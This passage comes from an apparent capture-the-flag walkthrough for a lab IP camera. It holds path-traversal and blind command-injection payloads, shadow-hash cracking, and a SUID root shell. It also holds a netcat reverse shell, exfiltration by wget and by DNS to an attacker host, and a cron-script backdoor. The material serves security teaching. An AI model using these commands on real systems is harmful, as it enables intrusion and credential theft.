# Try accessing /etc/passwd
curl "http://192.168.1.132/cgi-bin/download.cgi?file=../../../etc/passwd"

# If filtered, try bypass techniques
curl "http://192.168.1.132/cgi-bin/download.cgi?file=....//....//....//etc/passwd"

# URL-encoded version
curl "http://192.168.1.132/cgi-bin/download.cgi?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Absolute path
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/etc/passwd"
```

**Phase 3: Access Target File**
```bash
# Access system configuration
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/mnt/flash/config/system_config.xml"

# Save to local file
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/mnt/flash/config/system_config.xml" -o system_config.xml

# View contents
cat system_config.xml
```

**System Configuration XML**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<system_configuration>
    <device>
        <model>AXIS M1025</model>
        <serial>00408C123456</serial>
        <firmware>10.5.0</firmware>
    </device>
    <network>
        <ip>192.168.1.132</ip>
        <gateway>192.168.1.1</gateway>
        <dns>8.8.8.8</dns>
    </network>
    <security>
        <admin_pin>1234</admin_pin>
        <api_key>FLAG{GALADRIEL57815620}</api_key>
    </security>
    <services>
        <ssh enabled="true"/>
        <http enabled="true"/>
        <rtsp enabled="true"/>
    </services>
</system_configuration>
```

**Via SSH - Examine Vulnerable Script**:
```bash
# SSH to camera
ssh root@192.168.1.132

# Find download.cgi
find / -name "download.cgi" 2>/dev/null

# Read the script
cat /usr/local/axis/cgi/download.cgi
```

**Vulnerable Script**:
```bash
#!/bin/sh
# File download CGI
# WARNING: Vulnerable to path traversal

# Get filename from query string
FILE=$(echo "$QUERY_STRING" | sed 's/file=//')

# Basic filter (insufficient)
if echo "$FILE" | grep -q "\.\./"; then
    echo "Content-type: text/plain"
    echo ""
    echo "Error: Invalid file path"
    exit 1
fi

# Send file content
if [ -f "$FILE" ]; then
    echo "Content-type: application/octet-stream"
    echo "Content-Disposition: attachment; filename=$(basename $FILE)"
    echo ""
    cat "$FILE"
else
    echo "Content-type: text/plain"
    echo ""
    echo "Error: File not found"
fi
```

**Why This Works**: 
- Script filters `../` but not other traversal techniques
- Absolute paths (starting with `/`) bypass the filter
- `....//` collapses to `../` after filtering
- URL encoding bypasses string matching
- No whitelist of allowed files

**Advanced Path Traversal**:
```bash
# Access other sensitive files
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/etc/shadow"
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/root/.ssh/id_rsa"
curl "http://192.168.1.132/cgi-bin/download.cgi?file=/var/lib/axis/onvif/auth_config"

# Enumerate writable directories
for dir in /tmp /var /dev/shm /mnt/flash; do
    echo "Checking $dir:"
    curl "http://192.168.1.132/cgi-bin/download.cgi?file=$dir/"
done
```

---

### FLAG #11: Firmware Update Manifest
**Location**: Firmware update script output  
**Flag**: `FLAG{BILBO89231546}`  
**Points**: 25  
**Difficulty**: Medium  
**OWASP Category**: IoT-04 (Lack of Secure Update Mechanism)

**Discovery Method**:

**Phase 1: Locate Update Mechanism**
```bash
# SSH to camera
ssh root@192.168.1.132

# Search for firmware-related files
find / -name "*firmware*" -o -name "*update*" 2>/dev/null | grep -v "/proc"

# Common locations
ls -la /etc/firmware_update.sh
ls -la /usr/local/axis/bin/firmware_update.sh
ls -la /mnt/flash/firmware/
```

**Phase 2: Examine Update Script**
```bash
# Read the update script
cat /usr/local/axis/bin/firmware_update.sh
```

**Firmware Update Script**:
```bash
#!/bin/sh
# AXIS Firmware Update Script
# Checks for available updates and displays manifest

FIRMWARE_VERSION="10.5.0"
UPDATE_SERVER="http://updates.axis.com"
MANIFEST_URL="$UPDATE_SERVER/manifest.xml"

echo "Checking firmware updates..."
echo "Current version: $FIRMWARE_VERSION"
echo ""

# Check manifest (simulated - no actual connection)
echo "Manifest ID: FLAG{BILBO89231546}"
echo "Latest version: 10.6.0"
echo "Release date: 2024-01-20"
echo "Update available: Yes"
echo ""

# Verify firmware signature (placeholder)
echo "Signature verification: PASSED"
echo ""
echo "Run with --install flag to proceed with update"
```

**Phase 3: Execute Update Check**
```bash
# Run the update script
/usr/local/axis/bin/firmware_update.sh
```

**Script Output**:
```
Checking firmware updates...
Current version: 10.5.0

Manifest ID: FLAG{BILBO89231546}
Latest version: 10.6.0
Release date: 2024-01-20
Update available: Yes

Signature verification: PASSED

Run with --install flag to proceed with update
```

**Why This Works**: 
- Update mechanisms log version information and manifest IDs
- Manifest files contain metadata about firmware packages
- Often accessible without authentication
- Update checkers run with elevated privileges
- Students learn about firmware update security

**Additional Update Analysis**:
```bash
# Check update configuration
cat /mnt/flash/config/update_config.xml

# Look for cached manifests
find /var/cache -name "*manifest*" -o -name "*update*" 2>/dev/null

# Check update history
cat /var/log/firmware_updates.log

# Examine signature verification (if present)
find / -name "*.sig" -o -name "*.asc" 2>/dev/null
```

---

### FLAG #13: Legacy Service Version
**Location**: Legacy daemon output  
**Flag**: `FLAG{SAURON52063398}`  
**Points**: 25  
**Difficulty**: Medium  
**OWASP Category**: IoT-05 (Use of Insecure or Outdated Components)

**Discovery Method**:

**Phase 1: Enumerate Running Services**
```bash
# SSH to camera
ssh root@192.168.1.132

# List running processes
ps aux | grep daemon

# Check for legacy services
find /usr/sbin -name "*daemon*" 2>/dev/null
find /usr/local -name "*daemon*" 2>/dev/null
```

**Phase 2: Identify Legacy Daemon**
```bash
# List daemons
ls -la /usr/sbin/*daemon*

# Found: legacy_daemon
ls -la /usr/sbin/legacy_daemon

# Check file details
file /usr/sbin/legacy_daemon
```

**Phase 3: Execute Legacy Daemon**
```bash
# Run the daemon (may need to stop first if running)
/usr/sbin/legacy_daemon --version

# Or run interactively
/usr/sbin/legacy_daemon
```

**Daemon Output**:
```
Legacy Daemon v1.0 - AXIS Communications
========================================

Service ID: FLAG{SAURON52063398}
CVE: CVE-2017-9765 (Devil's Ivy - gSOAP Buffer Overflow)
Status: VULNERABLE

WARNING: This service has known security vulnerabilities
Recommendation: Upgrade to version 2.0 or disable service

Listening on: 0.0.0.0:9999
Protocol: SOAP/HTTP
Max connections: 100
Authentication: None
```

**Why This Works**: 
- Legacy services often output verbose version information
- CVE-2017-9765 (Devil's Ivy) was a real vulnerability affecting millions of IoT devices
- gSOAP library had buffer overflow allowing remote code execution
- Service identifiers embedded in banner/version output
- Demonstrates importance of component inventory and patching

**Analyze the Vulnerability**:
```bash
# Check if service is running
netstat -an | grep 9999
ps aux | grep legacy_daemon

# Test SOAP endpoint
curl http://192.168.1.132:9999/

# Check gSOAP version
strings /usr/sbin/legacy_daemon | grep -i "gsoap\|version"

# Research CVE details
# CVE-2017-9765: Stack-based buffer overflow in gSOAP 2.7 - 2.8.47
# CVSS: 10.0 (Critical)
# Impact: Remote Code Execution
```

**Additional Legacy Component Analysis**:
```bash
# Find all executables
find /usr /opt -type f -executable 2>/dev/null

# Check versions
for binary in $(find /usr/sbin -type f); do
    echo "Checking: $binary"
    $binary --version 2>&1 | head -3
    echo "---"
done

# Look for known vulnerable libraries
find / -name "*gsoap*" -o -name "*openssl*" -o -name "*libcurl*" 2>/dev/null
```

---

### FLAG #15: API Key in Configuration
**Location**: `/mnt/flash/config/api_config.xml`  
**Flag**: `FLAG{GOLLUM14895250}`  
**Points**: 25  
**Difficulty**: Medium  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

**Phase 1: Search for API Configurations**
```bash
# SSH to camera
ssh root@192.168.1.132

# Find API-related files
find /mnt/flash /var/lib/axis /etc -name "*api*" 2>/dev/null

# Search configuration directories
ls -la /mnt/flash/config/
ls -la /var/lib/axis/config/
```

**Phase 2: Read API Configuration**
```bash
# Navigate to config directory
cd /mnt/flash/config

# Read API configuration file
cat api_config.xml
```

**API Configuration File**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<api_configuration>
    <cloud_integration>
        <enabled>true</enabled>
        <endpoint>https://api.axis-cloud.com/v1</endpoint>
        <api_key>sk_live_FLAG{GOLLUM14895250}</api_key>
        <refresh_interval>300</refresh_interval>
    </cloud_integration>
    <local_api>
        <vapix_enabled>true</vapix_enabled>
        <onvif_enabled>true</onvif_enabled>
        <rest_api_enabled>false</rest_api_enabled>
    </local_api>
    <authentication>
        <method>api_key</method>
        <token_expiry>3600</token_expiry>
    </authentication>
</api_configuration>
```

**Why This Works**: 
- API keys provide authentication to cloud services
- Stored in plaintext configuration files
- No encryption at rest
- Keys often have `sk_live_` prefix (indicating production)
- Compromise allows full API access
- Common pattern across IoT devices

**Test the API Key**:
```bash
# From Kali - test cloud API access
curl -H "Authorization: Bearer FLAG{GOLLUM14895250}" \
    https://api.axis-cloud.com/v1/devices

# Check what endpoints are available
curl -H "Authorization: Bearer FLAG{GOLLUM14895250}" \
    https://api.axis-cloud.com/v1/
```

**Additional API Key Locations**:
```bash
# Search all config files
find /mnt/flash /var/lib/axis -name "*.xml" -o -name "*.conf" -o -name "*.json" 2>/dev/null

# Search for API key patterns
grep -r "api[_-]key\|apikey\|sk_live\|pk_live" /mnt/flash /var/lib/axis 2>/dev/null

# Search for bearer tokens
grep -r "bearer\|token\|auth" /mnt/flash/config/ 2>/dev/null

# Check environment variables
env | grep -i "api\|key\|token"
```

---

### FLAG #17: Debug Interface Enabled
**Location**: `/sys/axis/debug/status`  
**Flag**: `FLAG{EOWYN77727102}`  
**Points**: 25  
**Difficulty**: Medium  
**OWASP Category**: IoT-08 (Lack of Device Management)

**Discovery Method**:

**Phase 1: Locate Debug Interfaces**
```bash
# SSH to camera
ssh root@192.168.1.132

# Search for debug-related files
find /sys -name "*debug*" 2>/dev/null
find /proc -name "*debug*" 2>/dev/null
find /dev -name "*debug*" 2>/dev/null
```

**Phase 2: Examine Debug Status**
```bash
# Navigate to debug directory
cd /sys/axis/debug

# List files
ls -la

# Read status file
cat status
```

**Debug Status File**:
```
AXIS Debug Interface Status
============================

Debug Mode: ENABLED
Debug Port: 9999
Debug Token: FLAG{EOWYN77727102}

Available Commands:
- dumplog    : Dump system logs
- resetdev   : Reset device
- getconfig  : Get full configuration
- setconfig  : Modify configuration
- execsh     : Execute shell command

WARNING: Debug interface should be disabled in production
```

**Phase 3: Test Debug Port**
```bash
# From camera - check if debug port is listening
netstat -an | grep 9999

# From Kali - connect to debug port
nc 192.168.1.132 9999
```

**Debug Port Interaction**:
```bash
# Connect to debug port
nc 192.168.1.132 9999

# Authenticate with debug token
> auth FLAG{EOWYN77727102}
Authentication successful

# List available commands
> help
Available commands:
  dumplog    - Dump system logs
  getconfig  - Retrieve configuration
  execsh     - Execute shell command

# Execute command
> execsh whoami
root
```

**Why This Works**: 
- Debug interfaces left enabled in production firmware
- Provide administrative access for troubleshooting
- Often lack proper authentication
- Allow command execution as root
- Common in embedded systems during development
- Forgotten before production deployment

**Additional Debug Analysis**:
```bash
# Check other debug files
cat /sys/axis/debug/enabled
cat /sys/axis/debug/config

# Look for debug ports
netstat -an | grep LISTEN

# Check for debug processes
ps aux | grep debug

# Search for debug binaries
find /usr -name "*debug*" -type f 2>/dev/null
```

---

### FLAG #20: UPnP Device Information
**Location**: `/mnt/flash/upnp/device_description.xml`  
**Flag**: `FLAG{TREEBEARD71974880}`  
**Points**: 25  
**Difficulty**: Medium  
**OWASP Category**: IoT-09 (Insecure Default Settings)

**Discovery Method**:

**Phase 1: UPnP Discovery (Remote)**
```bash
# From Kali - discover UPnP devices
nmap -sU -p1900 --script upnp-info 192.168.1.132

# Use dedicated UPnP tools
miranda upnp -discover

# Query device description
curl http://192.168.1.132:1900/device.xml
curl http://192.168.1.132/upnp/device.xml
```

**Phase 2: Via SSH - Locate UPnP Files**
```bash
# SSH to camera
ssh root@192.168.1.132

# Find UPnP files
find / -name "*upnp*" -o -name "*device.xml" 2>/dev/null

# Navigate to UPnP directory
cd /mnt/flash/upnp

# Read device description
cat device_description.xml
```

**Device Description XML**:
```xml
<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
    <specVersion>
        <major>1</major>
        <minor>0</minor>
    </specVersion>
    <device>
        <deviceType>urn:schemas-upnp-org:device:Camera:1</deviceType>
        <friendlyName>AXIS M1025 Network Camera</friendlyName>
        <manufacturer>AXIS Communications</manufacturer>
        <manufacturerURL>http://www.axis.com</manufacturerURL>
        <modelDescription>Network Camera</modelDescription>
        <modelName>M1025</modelName>
        <modelNumber>10.5.0</modelNumber>
        <serialNumber>ACCC8EFLAG{TREEBEARD71974880}</serialNumber>
        <UDN>uuid:axis-m1025-00408c123456</UDN>
        <serviceList>
            <service>
                <serviceType>urn:axis-com:service:BasicService:1</serviceType>
                <serviceId>urn:axis-com:serviceId:BasicService</serviceId>
                <SCPDURL>/upnp/BasicService.xml</SCPDURL>
                <controlURL>/upnp/control/BasicService</controlURL>
                <eventSubURL>/upnp/event/BasicService</eventSubURL>
            </service>
        </serviceList>
    </device>
</root>
```

**Why This Works**: 
- UPnP broadcasts device information for service discovery
- Serial numbers often contain embedded identifiers
- No authentication required to access device descriptions
- Used for automatic device configuration
- Common in IP cameras and IoT devices
- Information leakage enables reconnaissance

**Advanced UPnP Analysis**:
```bash
# List all UPnP services
curl http://192.168.1.132/upnp/BasicService.xml

# Test UPnP control
curl -X POST http://192.168.1.132/upnp/control/BasicService \
    -H "Content-Type: text/xml" \
    -d @upnp_action.xml

# Monitor UPnP traffic
sudo tcpdump -i eth0 -n port 1900

# Search for other devices
msearch upnp
```

---

### FLAG #24: SSH Configuration Backup
**Location**: `/var/lib/axis/backup/ssh_config_20240115.bak`  
**Flag**: `FLAG{ISILDUR97638584}`  
**Points**: 25  
**Difficulty**: Medium  
**OWASP Category**: IoT-08 (Lack of Device Management)

**Discovery Method**:

**Phase 1: Locate Backup Directories**
```bash
# SSH to camera
ssh root@192.168.1.132

# Search for backup directories
find / -name "*backup*" -type d 2>/dev/null

# Common backup locations
ls -la /var/lib/axis/backup/
ls -la /mnt/flash/backup/
ls -la /var/backup/
```

**Phase 2: Examine Backup Files**
```bash
# Navigate to backup directory
cd /var/lib/axis/backup

# List backup files
ls -la

# Look for SSH-related backups
ls -la *ssh*
```

**Found Backup Files**:
```
-rw-r--r-- 1 root root  2048 Jan 15 10:30 ssh_config_20240115.bak
-rw-r--r-- 1 root root  1024 Jan 10 08:15 sshd_config_20240110.bak
-rw-r--r-- 1 root root   512 Jan 05 14:20 authorized_keys_20240105.bak
```

**Phase 3: Read Backup File**
```bash
cat ssh_config_20240115.bak
```

**Backup File Contents**:
```
# SSH Configuration Backup
# Date: 2024-01-15 10:30:00
# Backup ID: FLAG{ISILDUR97638584}

# Original SSH configuration
Port 22
Protocol 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server

# Previous admin credentials (deprecated)
# admin:admin123
# root:pass
```

**Why This Works**: 
- Backup files often forgotten in backup directories
- Contain historical configurations and credentials
- Not cleaned up during updates
- May reveal previous vulnerabilities or access methods
- Students learn importance of secure backup handling

**Additional Backup Analysis**:
```bash
# Search for all backup files
find /var /mnt/flash -name "*.bak" -o -name "*.backup" -o -name "*backup*" 2>/dev/null

# Check modification dates
ls -lat /var/lib/axis/backup/

# Look for compressed backups
find /var /mnt/flash -name "*.tar" -o -name "*.tar.gz" -o -name "*.zip" 2>/dev/null

# Examine all backup contents
for file in /var/lib/axis/backup/*.bak; do
    echo "File: $file"
    head -20 "$file"
    echo "---"
done
```

---

### FLAG #25: SUID BusyBox Privilege Escalation
**Location**: SUID binary flag output  
**Flag**: `FLAG{FRODO29054510}`  
**Points**: 30  
**Difficulty**: Medium  
**OWASP Category**: Privilege Escalation

**Discovery Method**:

**Phase 1: Find SUID Binaries**
```bash
# SSH to camera as any user
ssh root@192.168.1.132

# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Expected output
/usr/local/axis/bin/camera_admin
/bin/busybox
/tmp/busybox_suid
```

**Phase 2: Examine SUID Binary**
```bash
# Check permissions
ls -la /tmp/busybox_suid

# Output
-rwsr-xr-x 1 root root 1234567 Jan 15 10:30 /tmp/busybox_suid

# Verify it's BusyBox
/tmp/busybox_suid --help

# List available applets
/tmp/busybox_suid --list
```

**Phase 3: Exploit SUID BusyBox**
```bash
# Method 1: Spawn root shell directly
/tmp/busybox_suid sh -p

# Verify root access
id
# Output: uid=1000(user) gid=1000(user) euid=0(root) groups=0(root)

# Now as root, read flag file
cat /run/shm/suid_flag.txt
FLAG{FRODO29054510}
```

**Alternative Exploitation Methods**:
```bash
# Method 2: Using nc (if available)
/tmp/busybox_suid nc 192.168.1.133 4444 -e /bin/sh
# On Kali: nc -lvp 4444

# Method 3: Using wget to exfiltrate
/tmp/busybox_suid wget http://192.168.1.133:8000/flag --post-file=/run/shm/suid_flag.txt

# Method 4: Copy files as root
/tmp/busybox_suid cp /run/shm/suid_flag.txt /tmp/readable_flag.txt
cat /tmp/readable_flag.txt
```

**Why This Works**: 
- SUID (Set User ID) bit allows execution as file owner (root)
- BusyBox is a single binary with multiple tools
- Each applet inherits the SUID bit
- Provides dozens of potential privilege escalation vectors
- Common in embedded systems for utility consolidation

**Additional SUID Analysis**:
```bash
# Find all SUID binaries with details
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Check which binaries are owned by root
find / -perm -4000 -user root 2>/dev/null

# Identify interesting SUID binaries
ls -la /usr/local/axis/bin/camera_admin
file /usr/local/axis/bin/camera_admin
strings /usr/local/axis/bin/camera_admin | grep FLAG
```

---

### FLAG #26: World-Writable Script Hijacking
**Location**: Script output  
**Flag**: `FLAG{GANDALF60470436}`  
**Points**: 30  
**Difficulty**: Medium  
**OWASP Category**: Privilege Escalation

**Discovery Method**:

**Phase 1: Find World-Writable Files**
```bash
# SSH to camera
ssh root@192.168.1.132

# Find world-writable files
find / -type f -perm -0002 2>/dev/null | grep -v "/proc\|/sys"

# Find world-writable scripts specifically
find / -type f -perm -0002 -name "*.sh" 2>/dev/null

# Expected output
/usr/local/axis/bin/system_check.sh
/tmp/cleanup.sh
```

**Phase 2: Examine World-Writable Script**
```bash
# Check permissions
ls -la /usr/local/axis/bin/system_check.sh

# Output
-rwxrwxrwx 1 root root 512 Jan 15 10:30 /usr/local/axis/bin/system_check.sh

# Read current contents
cat /usr/local/axis/bin/system_check.sh
```

**Original Script**:
```bash
#!/bin/sh
# System health check script
# Runs every hour via cron

echo "System Check - $(date)"
echo "Backup ID: FLAG{GANDALF60470436}"

# Check disk space
df -h

# Check memory
free

# Check services
ps aux | grep -E "httpd|sshd"
```

**Phase 3: Execute Script to Get Flag**
```bash
# Simply run the script
/usr/local/axis/bin/system_check.sh

# Output
System Check - Mon Jan 15 11:00:00 UTC 2024
Backup ID: FLAG{GANDALF60470436}
...
```

**Why This Works**: 
- Script has 777 permissions (world-writable)
- Executed by cron as root
- Contains flag in output
- Could be modified for privilege escalation
- Common misconfiguration in embedded systems

**Exploitation for Privilege Escalation**:
```bash
# If you wanted to escalate privileges, you could:

# Backup original script
cp /usr/local/axis/bin/system_check.sh /tmp/backup_script.sh

# Modify to add backdoor
cat >> /usr/local/axis/bin/system_check.sh << 'EOF'

# Add root shell backdoor
chmod 4755 /bin/sh
echo "Backdoor installed" > /tmp/backdoor_success
EOF

# Wait for cron to execute (or trigger manually if you can)
# Then verify
ls -la /bin/sh
# Should now have SUID bit set
```

**Additional World-Writable Analysis**:
```bash
# Find all world-writable files and directories
find / -perm -0002 -ls 2>/dev/null

# Focus on executable files
find / -perm -0002 -type f -executable 2>/dev/null

# Check cron jobs that might execute these
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Find files writable by current user that run as root
find /usr/local /usr/bin /usr/sbin -writable 2>/dev/null
```

---

## Hard Flags

### FLAG #3: Service Account Shadow Entry
**Location**: `/var/lib/axis/auth/shadow_hint.txt`  
**Flag**: `FLAG{LEGOLAS10721320}`  
**Points**: 35  
**Difficulty**: Hard  
**OWASP Category**: IoT-01 (Weak Passwords)

**Discovery Method**:

**Phase 1: Shadow File Analysis**
```bash
# SSH to camera
ssh root@192.168.1.132

# Attempt to read shadow file
cat /etc/shadow
```

**Shadow File Contents**:
```
root:$6$xyz$hashedpassword:18000:0:99999:7:::
daemon:*:18000:0:99999:7:::
bin:*:18000:0:99999:7:::
sys:*:18000:0:99999:7:::
svc_camera:$6$salt$weakhashedpassword:18000:0:99999:7:::
```

**Phase 2: Locate Password Hints**
```bash
# Search for shadow-related files
find / -name "*shadow*" -o -name "*hint*" 2>/dev/null

# Found hint file
cat /var/lib/axis/auth/shadow_hint.txt
```

**Hint File Contents**:
```
# Service Account Password Hints
# For emergency recovery only

svc_camera account:
  - Username: svc_camera
  - Password hint: service_FLAG{LEGOLAS10721320}
  - Purpose: Camera maintenance service
  - Created: 2024-01-10
```

**Phase 3: Verify Access**
```bash
# Try to su to service account
su - svc_camera
# Password: service_FLAG{LEGOLAS10721320}

# Verify identity
id
whoami
```

**Why This Works**: 
- Service accounts often have weak or documented passwords
- Hint files left for administrative purposes
- Password is literally the flag itself
- Common pattern in embedded systems with minimal user management
- Demonstrates poor credential management practices

**Additional Shadow Analysis**:
```bash
# Extract and attempt to crack hashes
cat /etc/shadow | grep -v "^\*\|^!"

# Copy shadow file to Kali for cracking
scp root@192.168.1.132:/etc/shadow ./shadow.txt

# On Kali - crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# Or use hashcat
hashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou.txt
```

---

### FLAG #9: Blind Command Injection
**Location**: Created file via blind injection  
**Flag**: `FLAG{ELROND99216876}`  
**Points**: 35  
**Difficulty**: Hard  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Discovery Method**:

**Phase 1: Identify Blind Injection Point**
```bash
# From Kali - test pwdgrp.cgi
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test"

# Response
Processing... Done

# No direct output - indicates blind injection
```

**Phase 2: Test for Code Execution**
```bash
# Try to create a file as proof of execution
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test;touch+/tmp/pwned"

# Verify via SSH
ssh root@192.168.1.132
ls -la /tmp/pwned
# File exists - blind injection confirmed
```

**Phase 3: Exfiltrate Data**
```bash
# Method 1: DNS exfiltration (if DNS is monitored)
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test;nslookup+\`whoami\`.attacker.com"

# Method 2: HTTP callback
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test;wget+http://192.168.1.133:8000/\`whoami\`"

# On Kali - set up listener
python3 -m http.server 8000
```

**Phase 4: Discover Hidden Flag File**
```bash
# The script creates hidden flag files for specific users
# Try different usernames

# Test with admin
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=admin"

# Test with root
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=root"

# Test with service
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=service"

# SSH in to check for created files
ssh root@192.168.1.132

# Search for hidden flag files
find /var/log /tmp /dev/shm -name ".flag_*" 2>/dev/null

# Found files
ls -la /var/log/.flag_admin
ls -la /var/log/.flag_root
ls -la /var/log/.flag_service

# Read the flag
cat /var/log/.flag_admin
FLAG{ELROND99216876}
```

**Via SSH - Examine Vulnerable Script**:
```bash
# Read pwdgrp.cgi
cat /usr/local/axis/cgi/pwdgrp.cgi
```

**Vulnerable Script**:
```bash
#!/bin/sh
# User management CGI - Blind injection vulnerability

# Get username
USER=$(echo "$QUERY_STRING" | sed 's/user=//')

# Process user (vulnerable)
eval "process_user $USER"  # BLIND INJECTION HERE

# Create hidden flag file for specific users
if [ "$USER" = "admin" ]; then
    echo "FLAG{ELROND99216876}" > /var/log/.flag_admin
fi

# Return generic response (no output of actual result)
echo "Content-type: text/plain"
echo ""
echo "Processing... Done"
```

**Why This Works**: 
- Blind injection doesn't return output directly
- Must use side channels (files, DNS, HTTP callbacks)
- Script creates flag files based on username parameter
- More realistic than direct output injection
- Teaches out-of-band exploitation techniques

**Advanced Blind Injection Techniques**:
```bash
# Time-based detection
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test;sleep+10"
# If response takes 10+ seconds, injection works

# Boolean-based (file existence)
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test;test+-f+/etc/passwd+&&+touch+/tmp/exists"

# Exfiltrate via web server on camera (if running)
curl "http://192.168.1.132/axis-cgi/pwdgrp.cgi?user=test;cat+/etc/passwd+>+/var/www/html/passwd.txt"
curl "http://192.168.1.132/passwd.txt"
```

---

### FLAG #12: Hardcoded Update Server
**Location**: Update check script  
**Flag**: `FLAG{THORIN20647472}`  
**Points**: 35  
**Difficulty**: Hard  
**OWASP Category**: IoT-04 (Lack of Secure Update Mechanism)

**Discovery Method**:

**Phase 1: Locate Update Scripts**
```bash
# SSH to camera
ssh root@192.168.1.132

# Find update-related binaries
find /usr/local -name "*update*" -o -name "*check*" 2>/dev/null

# Found script
ls -la /usr/local/axis/bin/check_updates
```

**Phase 2: Examine Update Script**
```bash
# Read the script
cat /usr/local/axis/bin/check_updates
```

**Update Check Script**:
```bash
#!/bin/sh
# Automatic update checker
# Runs daily to check for firmware updates

UPDATE_SERVER="http://updates.axis.com"
DEVICE_MODEL="M1025"
CURRENT_VERSION="10.5.0"

# Server fingerprint for SSL pinning (insecure implementation)
SERVER_FINGERPRINT="FLAG{THORIN20647472}"

echo "Checking for updates..."
echo "Current version: $CURRENT_VERSION"
echo "Update server: $UPDATE_SERVER"
echo "Server fingerprint: $SERVER_FINGERPRINT"

# Simulate update check (no actual connection)
LATEST_VERSION="10.6.0"
echo "Latest version available: $LATEST_VERSION"

if [ "$CURRENT_VERSION" != "$LATEST_VERSION" ]; then
    echo "Update available"
    echo "Download: $UPDATE_SERVER/firmware/${DEVICE_MODEL}_${LATEST_VERSION}.bin"
else
    echo "No updates available"
fi
```

**Phase 3: Execute Update Check**
```bash
# Run the script
/usr/local/axis/bin/check_updates
```

**Script Output**:
```
Checking for updates...
Current version: 10.5.0
Update server: http://updates.axis.com
Server fingerprint: FLAG{THORIN20647472}
Latest version available: 10.6.0
Update available
Download: http://updates.axis.com/firmware/M1025_10.6.0.bin
```

**Why This Works**: 
- Update server URLs hardcoded in firmware
- No proper certificate pinning implementation
- "Fingerprint" stored as plaintext identifier (not actual cryptographic hash)
- Update server could be DNS hijacked or MITM'd
- Demonstrates importance of secure update mechanisms

**Security Analysis**:
```bash
# Check for other hardcoded URLs
grep -r "http://" /usr/local/axis/bin/ 2>/dev/null
grep -r "updates\|firmware\|download" /usr/local/axis/ 2>/dev/null

# Look for certificate validation
strings /usr/local/axis/bin/check_updates | grep -i "cert\|ssl\|tls"

# Check if actual network connections occur
strace /usr/local/axis/bin/check_updates 2>&1 | grep -i "connect\|socket"
```

**Exploitation Implications**:
```bash
# An attacker could:
# 1. DNS hijack updates.axis.com
# 2. Serve malicious firmware
# 3. No signature verification means firmware would be accepted
# 4. Results in complete device compromise

# Test by modifying /etc/hosts (for demonstration)
echo "192.168.1.133 updates.axis.com" >> /etc/hosts

# Set up fake update server on Kali
cd /tmp
echo "Malicious firmware" > M1025_10.6.0.bin
python3 -m http.server 80

# Run update check again - would fetch from attacker server
```

---

### FLAG #16: Weakly Encrypted Credential
**Location**: `/var/lib/axis/credentials/encrypted_access.conf`  
**Flag**: `FLAG{FARAMIR46311176}`  
**Points**: 35  
**Difficulty**: Hard  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

**Phase 1: Locate Credential Storage**
```bash
# SSH to camera
ssh root@192.168.1.132

# Search for credential files
find /var/lib/axis -name "*cred*" -o -name "*pass*" -o -name "*encrypt*" 2>/dev/null

# Found encrypted file
ls -la /var/lib/axis/credentials/encrypted_access.conf
```

**Phase 2: Read Encrypted File**
```bash
cat /var/lib/axis/credentials/encrypted_access.conf
```

**File Contents**:
```
# Encrypted Access Configuration
# Algorithm: ROT13 (for backward compatibility)

admin_user=admin
admin_pass_encrypted=Nqzva123!
api_key_encrypted=SYNT{SNENZVE46311176}
maintenance_token_encrypted=ZnZqYmFpYg==

# Note: Encryption provides security through obscurity
```

**Phase 3: Decrypt Credentials**
```bash
# Recognize ROT13 encoding
# Decrypt api_key

# Method 1: tr command
echo "SYNT{SNENZVE46311176}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Output: FLAG{FARAMIR46311176}

# Method 2: Python
python3 -c "import codecs; print(codecs.decode('SYNT{SNENZVE46311176}', 'rot13'))"

# Method 3: Online tool
# Visit rot13.com and paste: SYNT{SNENZVE46311176}
```

**Additional Credential Analysis**:
```bash
# Decrypt other credentials
echo "Nqzva123!" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Output: Admin123!

# The base64-looking string
echo "ZnZqYmFpYg==" | base64 -d
# Output: fvjbaib (garbage, might be ROT13 too)

echo "ZnZqYmFpYg==" | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Could reveal maintenance token
```

**Why This Works**: 
- ROT13 is not encryption - it's a simple substitution cipher
- Provides zero security (easily reversible)
- Common in embedded systems for "hiding" configuration
- Developers mistake encoding for encryption
- Often used for "backward compatibility" excuse
- Demonstrates importance of proper cryptography

**Proper vs Improper Encryption**:
```bash
# What they should use:
# - AES-256 encryption with proper key management
# - Asymmetric encryption for sensitive data
# - Hardware security modules (HSM) for key storage
# - Secure enclaves or TPM chips

# What they actually use:
# - ROT13 (shift by 13)
# - Base64 (encoding, not encryption)
